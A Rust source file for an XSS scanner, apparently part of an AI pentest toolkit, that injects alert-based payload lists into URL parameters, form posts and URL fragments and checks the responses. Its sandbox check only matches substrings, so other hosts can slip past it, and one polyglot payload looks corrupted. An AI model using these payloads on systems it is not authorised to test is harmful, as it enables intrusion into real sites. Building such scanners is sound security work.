/// ShieldAGI Tool: xss_inject
///
/// Tests for XSS vulnerabilities using HTTP requests and headless Chromium.
/// Supports reflected, stored, and DOM-based XSS detection with multiple
/// payload complexity levels.

use serde::{Deserialize, Serialize};
use std::process::Command;

#[derive(Debug, Serialize, Deserialize)]
pub struct XssResult {
    pub target_url: String,
    pub xss_type_tested: String,
    pub total_vulnerabilities: usize,
    pub vulnerabilities: Vec<XssVulnerability>,
    pub payloads_tested: usize,
    pub scan_duration_ms: u64,
    pub error: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct XssVulnerability {
    pub xss_type: String,
    pub input_field: String,
    pub payload: String,
    pub evidence: String,
    pub severity: String,
    pub context: String,
}

/// XSS payload sets by complexity level
fn get_payloads(level: &str) -> Vec<(&'static str, &'static str)> {
    // (payload, description)
    let mut payloads = vec![
        // Basic payloads — always included
        (r#"<script>alert('XSS')</script>"#, "basic-script-tag"),
        (r#"<img src=x onerror=alert('XSS')>"#, "img-onerror"),
        (r#"<svg onload=alert('XSS')>"#, "svg-onload"),
        (r#""><script>alert('XSS')</script>"#, "attribute-breakout"),
        (r#"'><script>alert('XSS')</script>"#, "single-quote-breakout"),
        (r#"javascript:alert('XSS')"#, "javascript-uri"),
    ];

    if level == "advanced" || level == "polyglot" {
        payloads.extend(vec![
            (r#"<img src=x onerror="alert(String.fromCharCode(88,83,83))">"#, "charcode-bypass"),
            (r#"<details open ontoggle=alert('XSS')>"#, "details-ontoggle"),
            (r#"<body onload=alert('XSS')>"#, "body-onload"),
            (r#"<input onfocus=alert('XSS') autofocus>"#, "input-autofocus"),
            (r#"<marquee onstart=alert('XSS')>"#, "marquee-onstart"),
            (r#"<div style="background:url(javascript:alert('XSS'))">"#, "css-background"),
            (r#"<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')">click</a>"#, "html-entity-bypass"),
            (r#"<iframe src="javascript:alert('XSS')">"#, "iframe-javascript"),
        ]);
    }

    if level == "polyglot" {
        payloads.extend(vec![
            // Polyglot payloads that work across multiple contexts
            (r#"jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik/*/alert()//"#, "polyglot-universal"),
            (r#"'-alert('XSS')-'"#, "template-literal-inject"),
            (r#"</script><script>alert('XSS')</script>"#, "script-tag-breakout"),
            (r#"{{constructor.constructor('alert(1)')()}}"#, "angular-template-injection"),
            (r#"${alert('XSS')}"#, "template-expression"),
        ]);
    }

    payloads
}

pub async fn tool_xss_inject(input: &serde_json::Value) -> Result<String, String> {
    let target_url = input["target_url"]
        .as_str()
        .ok_or("Missing 'target_url' field")?;

    // Safety: verify target is in sandbox network
    if !is_sandbox_target(target_url) {
        return Err(
            "SAFETY: xss_inject can only target sandbox URLs (172.28.x.x or shieldagi-*)".into(),
        );
    }

    let xss_type = input["xss_type"].as_str().unwrap_or("all");
    let payload_set = input["payload_set"].as_str().unwrap_or("basic");
    let cookie = input["cookie"].as_str();
    let input_fields: Vec<String> = input["input_fields"]
        .as_array()
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_str().map(String::from))
                .collect()
        })
        .unwrap_or_default();

    let payloads = get_payloads(payload_set);
    let start = std::time::Instant::now();
    let mut vulnerabilities = Vec::new();
    let mut payloads_tested = 0usize;

    // --- Test reflected XSS via HTTP requests ---
    if xss_type == "reflected" || xss_type == "all" {
        test_reflected_xss(
            target_url,
            &payloads,
            cookie,
            &input_fields,
            &mut vulnerabilities,
            &mut payloads_tested,
        );
    }

    // --- Test stored XSS via HTTP requests ---
    if xss_type == "stored" || xss_type == "all" {
        test_stored_xss(
            target_url,
            &payloads,
            cookie,
            &input_fields,
            &mut vulnerabilities,
            &mut payloads_tested,
        );
    }

    // --- Test DOM-based XSS via headless Chromium ---
    if xss_type == "dom" || xss_type == "all" {
        test_dom_xss(
            target_url,
            &payloads,
            cookie,
            &mut vulnerabilities,
            &mut payloads_tested,
        );
    }

    let duration = start.elapsed().as_millis() as u64;

    let result = XssResult {
        target_url: target_url.to_string(),
        xss_type_tested: xss_type.to_string(),
        total_vulnerabilities: vulnerabilities.len(),
        vulnerabilities,
        payloads_tested,
        scan_duration_ms: duration,
        error: None,
    };

    Ok(serde_json::to_string_pretty(&result).unwrap())
}

fn test_reflected_xss(
    target_url: &str,
    payloads: &[(&str, &str)],
    cookie: Option<&str>,
    input_fields: &[String],
    vulns: &mut Vec<XssVulnerability>,
    count: &mut usize,
) {
    // For reflected XSS, inject payloads into URL parameters
    let url = url::Url::parse(target_url).unwrap_or_else(|_| {
        url::Url::parse("http://localhost").unwrap()
    });

    // Get parameter names from URL or use provided input_fields
    let params: Vec<String> = if !input_fields.is_empty() {
        input_fields.clone()
    } else {
        url.query_pairs().map(|(k, _)| k.to_string()).collect()
    };

    if params.is_empty() {
        return;
    }

    for (payload, desc) in payloads {
        for param in &params {
            *count += 1;

            // Build URL with injected payload
            let mut test_url = url.clone();
            {
                let mut query = test_url.query_pairs_mut();
                query.clear();
                for (k, v) in url.query_pairs() {
                    if k == param.as_str() {
                        query.append_pair(&k, payload);
                    } else {
                        query.append_pair(&k, &v);
                    }
                }
            }

            // Use curl to fetch and check if payload is reflected
            let mut curl_args = vec![
                "-s", "-L",
                "-o", "/dev/stdout",
                "--max-time", "10",
            ];

            if let Some(c) = cookie {
                curl_args.extend(&["-b", c]);
            }

            let test_url_str = test_url.to_string();
            curl_args.push(&test_url_str);

            if let Ok(output) = Command::new("curl").args(&curl_args).output() {
                let body = String::from_utf8_lossy(&output.stdout);

                // Check if payload is reflected in response without encoding
                if body.contains(payload) {
                    vulns.push(XssVulnerability {
                        xss_type: "reflected".to_string(),
                        input_field: param.clone(),
                        payload: payload.to_string(),
                        evidence: format!("Payload reflected unencoded in response body"),
                        severity: "HIGH".to_string(),
                        context: desc.to_string(),
                    });
                }

                // Check for partial reflection (e.g., tag open but attributes stripped)
                if !body.contains(payload)
                    && (body.contains("<script") || body.contains("onerror=") || body.contains("onload="))
                {
                    vulns.push(XssVulnerability {
                        xss_type: "reflected".to_string(),
                        input_field: param.clone(),
                        payload: payload.to_string(),
                        evidence: "Partial XSS-related content reflected in response".to_string(),
                        severity: "MEDIUM".to_string(),
                        context: desc.to_string(),
                    });
                }
            }
        }
    }
}

fn test_stored_xss(
    target_url: &str,
    payloads: &[(&str, &str)],
    cookie: Option<&str>,
    input_fields: &[String],
    vulns: &mut Vec<XssVulnerability>,
    count: &mut usize,
) {
    // For stored XSS, POST payloads to the endpoint, then GET to check
    let fields: Vec<&str> = if !input_fields.is_empty() {
        input_fields.iter().map(|s| s.as_str()).collect()
    } else {
        vec!["content", "comment", "message", "body", "text", "name"]
    };

    for (payload, desc) in payloads.iter().take(3) {
        // Limit stored XSS tests
        for field in &fields {
            *count += 1;

            let post_data = format!("{}={}", field, urlencoding_simple(payload));

            let mut curl_args = vec![
                "-s", "-X", "POST",
                "-d", &post_data,
                "-H", "Content-Type: application/x-www-form-urlencoded",
                "--max-time", "10",
            ];

            if let Some(c) = cookie {
                curl_args.extend(&["-b", c]);
            }

            curl_args.push(target_url);

            // POST the payload
            let _ = Command::new("curl").args(&curl_args).output();

            // GET the page to check if stored payload renders
            let mut get_args = vec!["-s", "-L", "--max-time", "10"];
            if let Some(c) = cookie {
                get_args.extend(&["-b", c]);
            }
            get_args.push(target_url);

            if let Ok(output) = Command::new("curl").args(&get_args).output() {
                let body = String::from_utf8_lossy(&output.stdout);
                if body.contains(payload) {
                    vulns.push(XssVulnerability {
                        xss_type: "stored".to_string(),
                        input_field: field.to_string(),
                        payload: payload.to_string(),
                        evidence: "Payload persisted and returned unencoded in subsequent GET"
                            .to_string(),
                        severity: "CRITICAL".to_string(),
                        context: desc.to_string(),
                    });
                }
            }
        }
    }
}

fn test_dom_xss(
    target_url: &str,
    payloads: &[(&str, &str)],
    cookie: Option<&str>,
    vulns: &mut Vec<XssVulnerability>,
    count: &mut usize,
) {
    // Use headless Chromium to detect DOM-based XSS
    // Chromium is installed in the Docker sandbox (Dockerfile.pentest)
    for (payload, desc) in payloads.iter().take(6) {
        *count += 1;

        // Build a URL with the payload in the fragment (for DOM-based XSS)
        let test_url = format!("{}#{}", target_url, payload);

        // JavaScript to inject that monitors for XSS execution
        let check_script = r#"
            (async () => {
                let xssTriggered = false;
                const origAlert = window.alert;
                window.alert = function() { xssTriggered = true; };
                window.onerror = function() { xssTriggered = true; };

                // Wait for DOM to load and any scripts to execute
                await new Promise(r => setTimeout(r, 2000));

                // Check for injected script tags or event handlers
                const scripts = document.querySelectorAll('script');
                const dangerousAttrs = document.querySelectorAll('[onerror],[onload],[onclick],[onfocus]');

                return JSON.stringify({
                    xssTriggered,
                    injectedScripts: scripts.length,
                    dangerousAttrs: dangerousAttrs.length,
                    documentHTML: document.documentElement.innerHTML.substring(0, 500)
                });
            })()
        "#;

        let mut chromium_args = vec![
            "--headless",
            "--disable-gpu",
            "--no-sandbox",
            "--disable-web-security",
            "--run-all-compositor-stages-before-draw",
            "--virtual-time-budget=5000",
        ];

        if let Some(c) = cookie {
            let cookie_flag = format!("--cookie={}", c);
            chromium_args.push(Box::leak(cookie_flag.into_boxed_str()));
        }

        let js_flag = format!("--evaluate-script={}", check_script);
        chromium_args.push(Box::leak(js_flag.into_boxed_str()));
        chromium_args.push(Box::leak(test_url.into_boxed_str()));

        // Try chromium or chromium-browser
        let output = Command::new("chromium")
            .args(&chromium_args)
            .output()
            .or_else(|_| {
                Command::new("chromium-browser")
                    .args(&chromium_args)
                    .output()
            })
            .or_else(|_| {
                Command::new("google-chrome")
                    .args(&chromium_args)
                    .output()
            });

        if let Ok(output) = output {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if let Ok(result) = serde_json::from_str::<serde_json::Value>(&stdout) {
                let triggered = result["xssTriggered"].as_bool().unwrap_or(false);
                let dangerous_attrs = result["dangerousAttrs"].as_u64().unwrap_or(0);

                if triggered || dangerous_attrs > 0 {
                    vulns.push(XssVulnerability {
                        xss_type: "dom".to_string(),
                        input_field: "URL fragment".to_string(),
                        payload: payload.to_string(),
                        evidence: if triggered {
                            "XSS payload executed in headless browser (alert triggered)".to_string()
                        } else {
                            format!("Dangerous DOM attributes injected: {} elements", dangerous_attrs)
                        },
                        severity: "HIGH".to_string(),
                        context: desc.to_string(),
                    });
                }
            }
        }
    }
}

fn urlencoding_simple(s: &str) -> String {
    s.replace('%', "%25")
        .replace(' ', "%20")
        .replace('<', "%3C")
        .replace('>', "%3E")
        .replace('"', "%22")
        .replace('\'', "%27")
        .replace('&', "%26")
        .replace('=', "%3D")
}

fn is_sandbox_target(url: &str) -> bool {
    url.contains("172.28.")
        || url.contains("shieldagi-")
        || url.contains("localhost:3001")
        || url.contains("vulnerable-app")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sandbox_validation() {
        assert!(is_sandbox_target("http://172.28.0.3:3000/api/search?q=test"));
        assert!(is_sandbox_target("http://localhost:3001/api/search?q=test"));
        assert!(!is_sandbox_target("http://example.com/search"));
    }

    #[test]
    fn test_payload_sets() {
        let basic = get_payloads("basic");
        assert!(basic.len() >= 6);

        let advanced = get_payloads("advanced");
        assert!(advanced.len() > basic.len());

        let polyglot = get_payloads("polyglot");
        assert!(polyglot.len() > advanced.len());
    }

    #[test]
    fn test_urlencoding() {
        assert_eq!(
            urlencoding_simple("<script>"),
            "%3Cscript%3E"
        );
    }
}
